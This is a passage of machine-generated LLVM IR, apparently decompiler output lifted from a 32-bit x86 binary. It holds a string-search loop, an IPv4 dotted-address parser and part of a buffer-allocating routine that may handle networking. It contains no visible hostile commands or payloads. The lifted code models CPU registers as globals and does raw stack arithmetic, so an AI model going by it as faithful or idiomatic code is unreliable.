  %v0_80547cc = phi i32 [ %v0_80547cc.pre, %dec_label_pc_805479c ], [ %v0_80547c7, %dec_label_pc_80547c5 ]
  ret i32 %v0_80547cc

; uselistorder directives
  uselistorder i32 %v8_80547a6, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80547c9, { 1, 0 }
  uselistorder label %dec_label_pc_80547c5, { 1, 0 }
  uselistorder label %dec_label_pc_8054789, { 1, 0 }
}

define i32 @function_80547d0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80547d0:
  %v0_80547d1 = load i32, i32* @ebx, align 4
  %v2_80547e824 = load i8, i8* %arg1, align 1
  %v4_80547ea28 = icmp eq i8 %v2_80547e824, 0
  br i1 %v4_80547ea28, label %dec_label_pc_80547f2, label %dec_label_pc_80547ee.lr.ph

dec_label_pc_80547ee.lr.ph:                       ; preds = %dec_label_pc_80547d0
  %v3_80547e825 = zext i8 %v2_80547e824 to i32
  %v5_80547e826 = and i32 %v0_80547d1, -256
  %v6_80547e827 = or i32 %v3_80547e825, %v5_80547e826
  %v4_80547d6 = ptrtoint i8* %arg1 to i32
  %v1_80547e113 = inttoptr i32 %arg2 to i8*
  %v4_80547e1.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80547ee

dec_label_pc_80547dc:                             ; preds = %dec_label_pc_80547ee, %dec_label_pc_80547e0
  %v6_80547e122 = phi i32 [ %v6_80547e1, %dec_label_pc_80547e0 ], [ %v6_80547e117, %dec_label_pc_80547ee ]
  %v2_80547e121 = phi i8 [ %v2_80547e1, %dec_label_pc_80547e0 ], [ %v2_80547e114, %dec_label_pc_80547ee ]
  %v0_80547e020 = phi i32 [ %v1_80547e0, %dec_label_pc_80547e0 ], [ %arg2, %dec_label_pc_80547ee ]
  %v15_80547dc = icmp eq i8 %v2_80547e121, %v2_80547e831
  br i1 %v15_80547dc, label %dec_label_pc_80547f4, label %dec_label_pc_80547e0

dec_label_pc_80547e0:                             ; preds = %dec_label_pc_80547dc
  %v1_80547e0 = add i32 %v0_80547e020, 1
  %v1_80547e1 = inttoptr i32 %v1_80547e0 to i8*
  %v2_80547e1 = load i8, i8* %v1_80547e1, align 1
  %v3_80547e1 = zext i8 %v2_80547e1 to i32
  %v5_80547e1 = and i32 %v6_80547e122, -256
  %v6_80547e1 = or i32 %v3_80547e1, %v5_80547e1
  %v4_80547e3 = icmp eq i8 %v2_80547e1, 0
  %v1_80547e5 = icmp eq i1 %v4_80547e3, false
  br i1 %v1_80547e5, label %dec_label_pc_80547dc, label %dec_label_pc_80547e7

dec_label_pc_80547e7:                             ; preds = %dec_label_pc_80547e0, %dec_label_pc_80547ee
  %v4_80547e1.pre34 = phi i32 [ %v6_80547e117, %dec_label_pc_80547ee ], [ %v6_80547e1, %dec_label_pc_80547e0 ]
  %v1_80547e7 = add i32 %v0_80547e729, 1
  %v1_80547e8 = inttoptr i32 %v1_80547e7 to i8*
  %v2_80547e8 = load i8, i8* %v1_80547e8, align 1
  %v3_80547e8 = zext i8 %v2_80547e8 to i32
  %v5_80547e8 = and i32 %v6_80547e832, -256
  %v6_80547e8 = or i32 %v3_80547e8, %v5_80547e8
  %v4_80547ea = icmp eq i8 %v2_80547e8, 0
  br i1 %v4_80547ea, label %dec_label_pc_80547f2, label %dec_label_pc_80547ee

dec_label_pc_80547ee:                             ; preds = %dec_label_pc_80547ee.lr.ph, %dec_label_pc_80547e7
  %v4_80547e1.pre = phi i32 [ %v4_80547e1.pre.pre, %dec_label_pc_80547ee.lr.ph ], [ %v4_80547e1.pre34, %dec_label_pc_80547e7 ]
  %v6_80547e832 = phi i32 [ %v6_80547e827, %dec_label_pc_80547ee.lr.ph ], [ %v6_80547e8, %dec_label_pc_80547e7 ]
  %v2_80547e831 = phi i8 [ %v2_80547e824, %dec_label_pc_80547ee.lr.ph ], [ %v2_80547e8, %dec_label_pc_80547e7 ]
  %v0_80547e729 = phi i32 [ %v4_80547d6, %dec_label_pc_80547ee.lr.ph ], [ %v1_80547e7, %dec_label_pc_80547e7 ]
  %v2_80547e114 = load i8, i8* %v1_80547e113, align 1
  %v3_80547e115 = zext i8 %v2_80547e114 to i32
  %v5_80547e116 = and i32 %v4_80547e1.pre, -256
  %v6_80547e117 = or i32 %v3_80547e115, %v5_80547e116
  %v4_80547e318 = icmp eq i8 %v2_80547e114, 0
  %v1_80547e519 = icmp eq i1 %v4_80547e318, false
  br i1 %v1_80547e519, label %dec_label_pc_80547dc, label %dec_label_pc_80547e7

dec_label_pc_80547f2:                             ; preds = %dec_label_pc_80547e7, %dec_label_pc_80547d0
  br label %dec_label_pc_80547f4

dec_label_pc_80547f4:                             ; preds = %dec_label_pc_80547dc, %dec_label_pc_80547f2
  %v0_80547f6 = phi i32 [ 0, %dec_label_pc_80547f2 ], [ %v0_80547e729, %dec_label_pc_80547dc ]
  store i32 %v0_80547d1, i32* @ebx, align 4
  ret i32 %v0_80547f6

; uselistorder directives
  uselistorder i8 %v2_80547e114, { 1, 2, 0 }
  uselistorder i32 %v1_80547e7, { 1, 0 }
  uselistorder i32 %v6_80547e1, { 1, 0 }
  uselistorder i8 %v2_80547e1, { 1, 2, 0 }
  uselistorder i32 %v1_80547e0, { 1, 0 }
  uselistorder i8 %v2_80547e824, { 0, 2, 1 }
  uselistorder i32 %v0_80547d1, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80547f4, { 1, 0 }
  uselistorder label %dec_label_pc_80547ee, { 1, 0 }
  uselistorder label %dec_label_pc_80547e7, { 1, 0 }
}

define i32 @function_80547f8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80547f8:
  %v4_80547ff = ptrtoint i8* %arg1 to i32
  store i32 %v4_80547ff, i32* @ecx, align 4
  %v1_8054803 = icmp eq i8* %arg1, null
  br i1 %v1_8054803, label %dec_label_pc_8054884, label %dec_label_pc_8054807

dec_label_pc_8054807:                             ; preds = %dec_label_pc_80547f8
  %v0_8054815.pre = load i32, i32* @global_var_805d61c, align 4
  br label %dec_label_pc_8054812

dec_label_pc_8054812:                             ; preds = %dec_label_pc_8054807, %dec_label_pc_805485b
  %v2_805485e36 = phi i32 [ 1, %dec_label_pc_8054807 ], [ %v3_805485e, %dec_label_pc_805485b ]
  %v0_805481235 = phi i32 [ %v4_80547ff, %dec_label_pc_8054807 ], [ %v0_80548124, %dec_label_pc_805485b ]
  %v0_805487934 = phi i32 [ 0, %dec_label_pc_8054807 ], [ %v2_8054861, %dec_label_pc_805485b ]
  %v1_8054812 = inttoptr i32 %v0_805481235 to i8*
  %v2_8054812 = load i8, i8* %v1_8054812, align 1
  %v3_8054812 = sext i8 %v2_8054812 to i32
  %v2_805481b = mul nsw i32 %v3_8054812, 2
  %v3_805481b = add i32 %v2_805481b, %v0_8054815.pre
  %v4_805481b = inttoptr i32 %v3_805481b to i8*
  %v5_805481b = load i8, i8* %v4_805481b, align 1
  %v6_805481b = and i8 %v5_805481b, 8
  %v7_805481b = icmp eq i8 %v6_805481b, 0
  br i1 %v7_805481b, label %dec_label_pc_8054884, label %dec_label_pc_8054822

dec_label_pc_8054822:                             ; preds = %dec_label_pc_8054812
  %v4_8054836.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054836

dec_label_pc_8054826:                             ; preds = %dec_label_pc_8054836
  %v3_8054826 = mul i32 %v1_8054826, 10
  %v2_8054829 = add i32 %v3_8054826, -48
  %v3_8054829 = add i32 %v2_8054829, %v2_8054838
  %v1_805482d = add i32 %v3_8054829, -255
  %v6_805482d = sub i32 254, %v3_8054829
  %v7_805482d = and i32 %v6_805482d, %v3_8054829
  %v8_805482d = icmp slt i32 %v7_805482d, 0
  %v9_805482d = icmp eq i32 %v1_805482d, 0
  %v10_805482d = icmp slt i32 %v1_805482d, 0
  %v3_8054833 = icmp eq i1 %v10_805482d, %v8_805482d
  %v4_8054833 = icmp eq i1 %v9_805482d, false
  %v5_8054833 = and i1 %v4_8054833, %v3_8054833
  br i1 %v5_8054833, label %dec_label_pc_8054884, label %dec_label_pc_8054835

dec_label_pc_8054835:                             ; preds = %dec_label_pc_8054826
  %v1_8054835 = add i32 %v0_8054835, 1
  store i32 %v1_8054835, i32* @ecx, align 4
  br label %dec_label_pc_8054836

dec_label_pc_8054836:                             ; preds = %dec_label_pc_8054822, %dec_label_pc_8054835
  %v1_8054826 = phi i32 [ 0, %dec_label_pc_8054822 ], [ %v3_8054829, %dec_label_pc_8054835 ]
  %v4_8054836 = phi i32 [ %v4_8054836.pre, %dec_label_pc_8054822 ], [ %v6_8054836, %dec_label_pc_8054835 ]
  %v0_8054835 = phi i32 [ %v0_805481235, %dec_label_pc_8054822 ], [ %v1_8054835, %dec_label_pc_8054835 ]
  %v1_8054836 = inttoptr i32 %v0_8054835 to i8*
  %v2_8054836 = load i8, i8* %v1_8054836, align 1
  %v3_8054836 = zext i8 %v2_8054836 to i32
  %v5_8054836 = and i32 %v4_8054836, -256
  %v6_8054836 = or i32 %v3_8054836, %v5_8054836
  store i32 %v6_8054836, i32* @edx, align 4
  %v2_8054838 = sext i8 %v2_8054836 to i32
  %v2_805483b = mul nsw i32 %v2_8054838, 2
  %v3_805483b = add i32 %v2_805483b, %v0_8054815.pre
  %v4_805483b = inttoptr i32 %v3_805483b to i16*
  %v5_805483b = load i16, i16* %v4_805483b, align 2
  %v2_8054840 = and i16 %v5_805483b, 8
  %v3_8054840 = icmp eq i16 %v2_8054840, 0
  %v1_8054842 = icmp eq i1 %v3_8054840, false
  br i1 %v1_8054842, label %dec_label_pc_8054826, label %dec_label_pc_8054844

dec_label_pc_8054844:                             ; preds = %dec_label_pc_8054836
  %v8_8054844 = sub nsw i32 2, %v2_805485e36
  %v9_8054844 = and i32 %v8_8054844, %v2_805485e36
  %v10_8054844 = icmp slt i32 %v9_8054844, 0
  %v11_8054844 = icmp eq i32 %v2_805485e36, 3
  %v12_8054844 = icmp slt i32 %v2_805485e36, 3
  %v3_8054848 = icmp eq i1 %v12_8054844, %v10_8054844
  %v4_8054848 = icmp eq i1 %v11_8054844, false
  %v5_8054848 = and i1 %v4_8054848, %v3_8054848
  br i1 %v5_8054848, label %dec_label_pc_8054852, label %dec_label_pc_805484a

dec_label_pc_805484a:                             ; preds = %dec_label_pc_8054844
  %v10_805484a = icmp eq i8 %v2_8054836, 46
  %v1_805484d = icmp eq i1 %v10_805484a, false
  br i1 %v1_805484d, label %dec_label_pc_8054884, label %dec_label_pc_805484f

dec_label_pc_805484f:                             ; preds = %dec_label_pc_805484a
  %v1_805484f = add i32 %v0_8054835, 1
  store i32 %v1_805484f, i32* @ecx, align 4
  br label %dec_label_pc_805485b

dec_label_pc_8054852:                             ; preds = %dec_label_pc_8054844
  %v1_8054852 = add i32 %v0_8054835, 1
  store i32 %v1_8054852, i32* @ecx, align 4
  %v4_8054853 = icmp eq i8 %v2_8054836, 0
  br i1 %v4_8054853, label %dec_label_pc_805485b, label %dec_label_pc_8054857

dec_label_pc_8054857:                             ; preds = %dec_label_pc_8054852
  %v2_8054857 = and i16 %v5_805483b, 32
  %v3_8054857 = icmp eq i16 %v2_8054857, 0
  br i1 %v3_8054857, label %dec_label_pc_8054884, label %dec_label_pc_805485b

dec_label_pc_805485b:                             ; preds = %dec_label_pc_8054857, %dec_label_pc_8054852, %dec_label_pc_805484f
  %v0_80548124 = phi i32 [ %v1_8054852, %dec_label_pc_8054857 ], [ %v1_8054852, %dec_label_pc_8054852 ], [ %v1_805484f, %dec_label_pc_805484f ]
  %v2_805485b = mul i32 %v0_805487934, 256
  %v3_805485e = add nuw nsw i32 %v2_805485e36, 1
  %v2_8054861 = or i32 %v1_8054826, %v2_805485b
  %v7_8054867 = icmp sgt i32 %v2_805485e36, 3
  br i1 %v7_8054867, label %dec_label_pc_8054869, label %dec_label_pc_8054812

dec_label_pc_8054869:                             ; preds = %dec_label_pc_805485b
  %v4_805486e = icmp eq i32 %arg2, 0
  br i1 %v4_805486e, label %dec_label_pc_8054886, label %dec_label_pc_8054875

dec_label_pc_8054875:                             ; preds = %dec_label_pc_8054869
  %v1_8054879 = call i32 @llvm.bswap.i32(i32 %v2_8054861)
  %v2_805487b = inttoptr i32 %arg2 to i32*
  store i32 %v1_8054879, i32* %v2_805487b, align 4
  br label %dec_label_pc_8054886

dec_label_pc_8054884:                             ; preds = %dec_label_pc_8054857, %dec_label_pc_805484a, %dec_label_pc_8054812, %dec_label_pc_8054826, %dec_label_pc_80547f8
  br label %dec_label_pc_8054886

dec_label_pc_8054886:                             ; preds = %dec_label_pc_8054869, %dec_label_pc_8054875, %dec_label_pc_8054884
  %v0_805488b = phi i32 [ 1, %dec_label_pc_8054869 ], [ 1, %dec_label_pc_8054875 ], [ 0, %dec_label_pc_8054884 ]
  ret i32 %v0_805488b

; uselistorder directives
  uselistorder i32 %v2_8054838, { 1, 0 }
  uselistorder i32 %v6_8054836, { 1, 0 }
  uselistorder i8 %v2_8054836, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8054835, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805482d, { 1, 0 }
  uselistorder i32 %v3_8054829, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805481235, { 1, 0 }
  uselistorder i32 %v2_805485e36, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054886, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054884, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8054836, { 1, 0 }
  uselistorder label %dec_label_pc_8054812, { 1, 0 }
}

define i32 @function_805488c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_805488c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 512, i32* %stack_var_-252, align 4
  %v1_80548a2 = call i32 @function_8051f6a(i32 512)
  store i32 %v1_80548a2, i32* %eax.global-to-local, align 4
  store i32 1025, i32* %stack_var_-252, align 4
  store i32 %v1_80548a2, i32* @ebp, align 4
  %v1_80548b0 = call i32 @function_8051f6a(i32 1025)
  store i32 %v1_80548b0, i32* %eax.global-to-local, align 4
  %v12_80548b9 = ptrtoint i32* %stack_var_-236 to i32
  %v1_80548bc = icmp eq i32 %v1_80548a2, 0
  br i1 %v1_80548bc, label %dec_label_pc_8054f35, label %dec_label_pc_80548c4

dec_label_pc_80548c4:                             ; preds = %dec_label_pc_805488c
  %v1_80548c4 = icmp eq i32 %v1_80548b0, 0
  br i1 %v1_80548c4, label %dec_label_pc_8054f35, label %dec_label_pc_80548cc

dec_label_pc_80548cc:                             ; preds = %dec_label_pc_80548c4
  %v5_80548cc = icmp eq i32 %arg2, 0
  br i1 %v5_80548cc, label %dec_label_pc_8054f35, label %dec_label_pc_80548da

dec_label_pc_80548da:                             ; preds = %dec_label_pc_80548cc
  %v4_80548da = ptrtoint i8* %arg1 to i32
  store i32 %v4_80548da, i32* %eax.global-to-local, align 4
  %v2_80548e1 = load i8, i8* %arg1, align 1
  %v3_80548e1 = icmp eq i8 %v2_80548e1, 0
  br i1 %v3_80548e1, label %dec_label_pc_8054f35, label %dec_label_pc_80548ea

dec_label_pc_80548ea:                             ; preds = %dec_label_pc_80548da
  store i32 %v4_80548da, i32* %stack_var_-252, align 4
  %v2_80548ee = call i32 @function_80514b0(i8* nonnull %arg1)
  store i32 %v2_80548ee, i32* @eax, align 4
  store i32 %v4_80548da, i32* %edx.global-to-local, align 4
  %v2_8054911 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8054911, i32* @ebx, align 4
  store i32 %v2_8054911, i32* %stack_var_-252, align 4
  %v2_8054919 = call i32 @function_80535d2(i32 %v2_8054911, i32 134559183)
  store i32 %v2_8054919, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8063b28.395 to i32), i32* %stack_var_-252, align 4
  %v1_8054925 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_8063b28.395 to i32))
  %v0_805492a = load i64, i64* @global_var_8063b40.396, align 8
  %v1_805492a = trunc i64 %v0_805492a to i32
  %v1_805492f = ashr i32 %v1_805492a, 31
  %v6_8054930 = and i64 %v0_805492a, 4294967295
  %v8_8054930 = zext i32 %v1_805492f to i64
  %v9_8054930 = mul nuw i64 %v8_8054930, 4294967296
  %v10_8054930 = or i64 %v9_8054930, %v6_8054930
  %v14_8054930 = srem i64 %v10_8054930, %tmp33
  %v15_8054930 = trunc i64 %v14_8054930 to i32
  %v0_8054937 = load i16, i16* @global_var_805d884.397, align 4
  %v2_8054946 = load i32, i32* %stack_var_-252, align 4
  store i32 %v2_8054946, i32* @eax, align 4
  store i32 134559183, i32* %edx.global-to-local, align 4
  store i32 %v2_8054911, i32* %stack_var_-252, align 4
  %v2_805494b = call i32 @function_80535d2(i32 %v2_8054911, i32 1)
  store i32 %v2_805494b, i32* %eax.global-to-local, align 4
  %v3_805498f = sext i16 %v0_8054937 to i32
  %v5_8054af2 = inttoptr i32 %v15_8054930 to i8*
  %v1_8054f1084 = add i32 %v12_80548b9, 28
  %v2_8054f1085 = inttoptr i32 %v1_8054f1084 to i32*
  %v3_8054f1086 = load i32, i32* %v2_8054f1085, align 4
  %tmp115 = icmp ult i32 %v3_8054f1086, 3
  br i1 %tmp115, label %dec_label_pc_8054970, label %dec_label_pc_8054f35

dec_label_pc_8054970:                             ; preds = %dec_label_pc_80548ea, %dec_label_pc_8054f10.backedge
  %v0_805497788 = phi i32 [ %v0_8054f10.pre, %dec_label_pc_8054f10.backedge ], [ %v12_80548b9, %dec_label_pc_80548ea ]
  %v1_8054970 = add i32 %v0_805497788, 20
  %v2_8054970 = inttoptr i32 %v1_8054970 to i32*
  %v3_8054970 = load i32, i32* %v2_8054970, align 4
  %v13_8054970 = icmp eq i32 %v3_8054970, -1
  br i1 %v13_8054970, label %dec_label_pc_8054970.dec_label_pc_8054986_crit_edge, label %dec_label_pc_8054977

dec_label_pc_8054970.dec_label_pc_8054986_crit_edge: ; preds = %dec_label_pc_8054970
  %v0_8054986.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054986

dec_label_pc_8054977:                             ; preds = %dec_label_pc_8054970
  %v3_805497a = load i32, i32* %v2_8054970, align 4
  %v5_805497a = add i32 %v0_805497788, -16
  %v6_805497a = inttoptr i32 %v5_805497a to i32*
  store i32 %v3_805497a, i32* %v6_805497a, align 4
  %v1_805497e = call i32 @function_8050138(i32 -1)
  store i32 %v1_805497e, i32* %eax.global-to-local, align 4
  %v0_8054983 = load i32, i32* @esp, align 4
  %v1_8054983 = add i32 %v0_8054983, 16
  br label %dec_label_pc_8054986

dec_label_pc_8054986:                             ; preds = %dec_label_pc_8054970.dec_label_pc_8054986_crit_edge, %dec_label_pc_8054977
  %v1_8054986 = phi i32 [ %v0_805497788, %dec_label_pc_8054970.dec_label_pc_8054986_crit_edge ], [ %v1_8054983, %dec_label_pc_8054977 ]
  %v0_8054986 = phi i32 [ %v0_8054986.pre, %dec_label_pc_8054970.dec_label_pc_8054986_crit_edge ], [ %v1_805497e, %dec_label_pc_8054977 ]
  %v2_8054986 = add i32 %v1_8054986, -4
  %v3_8054986 = inttoptr i32 %v2_8054986 to i32*
  store i32 %v0_8054986, i32* %v3_8054986, align 4
  %v1_8054987 = add i32 %v1_8054986, -8
  %v2_8054987 = inttoptr i32 %v1_8054987 to i32*
  store i32 512, i32* %v2_8054987, align 4
  %v1_805498c = add i32 %v1_8054986, -12
  %v2_805498c = inttoptr i32 %v1_805498c to i32*
  store i32 0, i32* %v2_805498c, align 4
  %v2_805498e = add i32 %v1_8054986, -16
  %v3_805498e = inttoptr i32 %v2_805498e to i32*
  store i32 %v1_80548a2, i32* %v3_805498e, align 4
  %v5_805498f = call i32 @function_805143c(i8* inttoptr (i32 -1 to i8*), i32 %v15_8054930, i32 %v3_805498f)
  store i32 %v5_805498f, i32* %eax.global-to-local, align 4
  %v0_8054994 = load i32, i32* @esp, align 4
  %v1_8054997 = add i32 %v0_8054994, 8
  %v2_8054997 = inttoptr i32 %v1_8054997 to i32*
  store i32 48, i32* %v2_8054997, align 4
  %v1_8054999 = add i32 %v0_8054994, 4
  %v2_8054999 = inttoptr i32 %v1_8054999 to i32*
  store i32 0, i32* %v2_8054999, align 4
  %v1_805499b = add i32 %v0_8054994, 84
  store i32 %v1_805499b, i32* @ebx, align 4
  %v3_805499f = inttoptr i32 %v0_8054994 to i32*
  store i32 %v1_805499b, i32* %v3_805499f, align 4
  %v5_80549a0 = call i32 @function_805143c(i8* inttoptr (i32 -1 to i8*), i32 %v15_8054930, i32 %v3_805498f)
  store i32 %v5_80549a0, i32* %eax.global-to-local, align 4
  %v0_80549a5 = load i32, i32* @esp, align 4
  %v1_80549a5 = add i32 %v0_80549a5, 60
  %v2_80549a5 = inttoptr i32 %v1_80549a5 to i32*
  %v3_80549a5 = load i32, i32* %v2_80549a5, align 4
  store i32 %v3_80549a5, i32* %eax.global-to-local, align 4
  %v1_80549a9 = add i32 %v0_80549a5, 116
  %v2_80549a9 = inttoptr i32 %v1_80549a9 to i32*
  store i32 1, i32* %v2_80549a9, align 4
  %v0_80549b1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80549b1 = add i32 %v0_80549b1, 1
  %v0_80549b2 = load i32, i32* @esp, align 4
  %v1_80549b2 = add i32 %v0_80549b2, 104
  %v2_80549b2 = inttoptr i32 %v1_80549b2 to i32*
  store i32 1, i32* %v2_80549b2, align 4
  %v1_80549ba = urem i32 %v1_80549b1, 65536
  store i32 %v1_80549ba, i32* %eax.global-to-local, align 4
  %v1_80549bf = load i32, i32* @esp, align 4
  %v2_80549bf = add i32 %v1_80549bf, 60
  %v3_80549bf = inttoptr i32 %v2_80549bf to i32*
  store i32 %v1_80549ba, i32* %v3_80549bf, align 4
  %v0_80549c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80549c3 = load i32, i32* @esp, align 4
  %v2_80549c3 = add i32 %v1_80549c3, 84
  %v3_80549c3 = inttoptr i32 %v2_80549c3 to i32*
  store i32 %v0_80549c3, i32* %v3_80549c3, align 4
  %v0_80549c7 = load i32, i32* @esp, align 4
  %v1_80549ca = add i32 %v0_80549c7, 8
  %v2_80549ca = inttoptr i32 %v1_80549ca to i32*
  store i32 512, i32* %v2_80549ca, align 4
  %v2_80549cf = add i32 %v0_80549c7, 4
  %v3_80549cf = inttoptr i32 %v2_80549cf to i32*
  store i32 %v1_80548a2, i32* %v3_80549cf, align 4
  %v0_80549d0 = load i32, i32* @ebx, align 4
  %v3_80549d0 = inttoptr i32 %v0_80549c7 to i32*
  store i32 %v0_80549d0, i32* %v3_80549d0, align 4
  %v0_80549d1 = call i32 @function_805615c()
  store i32 %v0_80549d1, i32* %eax.global-to-local, align 4
  %v0_80549d6 = load i32, i32* @esp, align 4
  store i32 %v0_80549d1, i32* @ebx, align 4
  %v2_80549db = icmp slt i32 %v0_80549d1, 0
  br i1 %v2_80549db, label %dec_label_pc_8054f35, label %dec_label_pc_80549e3

dec_label_pc_80549e3:                             ; preds = %dec_label_pc_8054986
  %v2_80549e3 = add i32 %v0_80549d6, 12
  %v3_80549e3 = inttoptr i32 %v2_80549e3 to i32*
  store i32 %v0_80549d1, i32* %v3_80549e3, align 4
  %v1_80549e4 = add i32 %v0_80549d6, 8
  %v2_80549e4 = inttoptr i32 %v1_80549e4 to i32*
  store i32 1025, i32* %v2_80549e4, align 4
  %v1_80549e9 = add i32 %v0_80549d6, 256
  %v2_80549e9 = inttoptr i32 %v1_80549e9 to i32*
  %v3_80549e9 = load i32, i32* %v2_80549e9, align 4
  %v5_80549e9 = add i32 %v0_80549d6, 4
  %v6_80549e9 = inttoptr i32 %v5_80549e9 to i32*
  store i32 %v3_80549e9, i32* %v6_80549e9, align 4
  %v1_80549f0 = add i32 %v0_80549d6, 28
  %v2_80549f0 = inttoptr i32 %v1_80549f0 to i32*
  %v3_80549f0 = load i32, i32* %v2_80549f0, align 4
  %v6_80549f0 = inttoptr i32 %v0_80549d6 to i32*
  store i32 %v3_80549f0, i32* %v6_80549f0, align 4
  %v6_80549f4 = call i32 @function_80514c4(i8* inttoptr (i32 -1 to i8*), i32 %v15_8054930, i32 %v3_805498f, i32 ptrtoint (i32* @0 to i32))
  %v0_80549f9 = load i32, i32* @esp, align 4
  %v1_80549fc = add i32 %v0_80549f9, 8
  %v2_80549fc = inttoptr i32 %v1_80549fc to i32*
  store i32 ptrtoint (i32* @global_var_805d888.337 to i32), i32* %v2_80549fc, align 4
  %v1_8054a01 = add i32 %v0_80549f9, 4
  %v2_8054a01 = inttoptr i32 %v1_8054a01 to i32*
  store i32 134559183, i32* %v2_8054a01, align 4
  %v1_8054a06 = add i32 %v0_80549f9, 200
  store i32 %v1_8054a06, i32* @eax, align 4
  %v3_8054a0d = inttoptr i32 %v0_80549f9 to i32*
  store i32 %v1_8054a06, i32* %v3_8054a0d, align 4
  %v2_8054a0e = call i32 @function_80535d2(i32 -1, i32 %v15_8054930)
  store i32 %v2_8054a0e, i32* %eax.global-to-local, align 4
  %v0_8054a13 = load i32, i32* @esp, align 4
  %v1_8054a13 = inttoptr i32 %v0_8054a13 to i32*
  store i32 ptrtoint (i32* @global_var_805d888.337 to i32), i32* %v1_8054a13, align 4
  %v1_8054a1a = call i32 @function_80535cf(i32 -1)
  store i32 %v1_8054a1a, i32* %eax.global-to-local, align 4
  %v0_8054a1f = load i32, i32* @esp, align 4
  %v1_8054a1f = add i32 %v0_8054a1f, 56
  %v2_8054a1f = inttoptr i32 %v1_8054a1f to i32*
  %v3_8054a1f = load i32, i32* %v2_8054a1f, align 4
  store i32 %v3_8054a1f, i32* %edx.global-to-local, align 4
  %v1_8054a23 = add i32 %v0_8054a1f, 268
  %v2_8054a23 = inttoptr i32 %v1_8054a23 to i32*
  %v3_8054a23 = load i32, i32* %v2_8054a23, align 4
  store i32 %v3_8054a23, i32* %eax.global-to-local, align 4
  %v2_8054a2a = mul i32 %v3_8054a1f, 4
  %v3_8054a2a = add i32 %v3_8054a23, %v2_8054a2a
  %v4_8054a2a = inttoptr i32 %v3_8054a2a to i32*
  %v5_8054a2a = load i32, i32* %v4_8054a2a, align 4
  store i32 %v5_8054a2a, i32* %edx.global-to-local, align 4
  %v2_8054a2d = add i32 %v0_8054a1f, 48
  %v3_8054a2d = inttoptr i32 %v2_8054a2d to i32*
  store i32 %v5_8054a2a, i32* %v3_8054a2d, align 4
  %v0_8054a31 = load i32, i32* @esp, align 4
  %v1_8054a31 = add i32 %v0_8054a31, 16
  %v1_8054a34 = add i32 %v0_8054a31, 52
  %v2_8054a34 = inttoptr i32 %v1_8054a34 to i32*
  %v3_8054a34 = load i32, i32* %v2_8054a34, align 4
  %v5_8054a34 = icmp slt i32 %v3_8054a34, 0
  br i1 %v5_8054a34, label %dec_label_pc_80549e3.dec_label_pc_8054a7a_crit_edge, label %dec_label_pc_8054a3b

dec_label_pc_80549e3.dec_label_pc_8054a7a_crit_edge: ; preds = %dec_label_pc_80549e3
  %v0_8054a7a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a7a

dec_label_pc_8054a3b:                             ; preds = %dec_label_pc_80549e3
  store i32 %v3_8054a34, i32* %eax.global-to-local, align 4
  %v1_8054a3f = load i32, i32* @global_var_8063f78.398, align 8
  %v2_8054a3f = sub i32 %v3_8054a34, %v1_8054a3f
  %v8_8054a3f = xor i32 %v1_8054a3f, %v3_8054a34
  %v9_8054a3f = xor i32 %v2_8054a3f, %v3_8054a34
  %v10_8054a3f = and i32 %v9_8054a3f, %v8_8054a3f
  %v11_8054a3f = icmp slt i32 %v10_8054a3f, 0
  %v13_8054a3f = icmp slt i32 %v2_8054a3f, 0
  %v2_8054a45 = icmp eq i1 %v13_8054a3f, %v11_8054a3f
  br i1 %v2_8054a45, label %dec_label_pc_8054a7a, label %dec_label_pc_8054a47

dec_label_pc_8054a47:                             ; preds = %dec_label_pc_8054a3b
  %v2_8054a47 = add i32 %v0_8054a31, 12
  %v3_8054a47 = inttoptr i32 %v2_8054a47 to i32*
  store i32 %v3_8054a34, i32* %v3_8054a47, align 4
  %v1_8054a48 = add i32 %v0_8054a31, 8
  %v2_8054a48 = inttoptr i32 %v1_8054a48 to i32*
  store i32 1025, i32* %v2_8054a48, align 4
  %v1_8054a4d = add i32 %v0_8054a31, 4
  %v2_8054a4d = inttoptr i32 %v1_8054a4d to i32*
  store i32 ptrtoint (i32* @global_var_805c91c.399 to i32), i32* %v2_8054a4d, align 4
  %v1_8054a52 = add i32 %v0_8054a31, 28
  %v2_8054a52 = inttoptr i32 %v1_8054a52 to i32*
  %v3_8054a52 = load i32, i32* %v2_8054a52, align 4
  %v6_8054a52 = inttoptr i32 %v0_8054a31 to i32*
  store i32 %v3_8054a52, i32* %v6_8054a52, align 4
  %v0_8054a56 = call i32 @function_8055b34()
  store i32 %v0_8054a56, i32* %eax.global-to-local, align 4
  %v0_8054a5b = load i32, i32* @esp, align 4
  %v1_8054a5e = add i32 %v0_8054a5b, 8
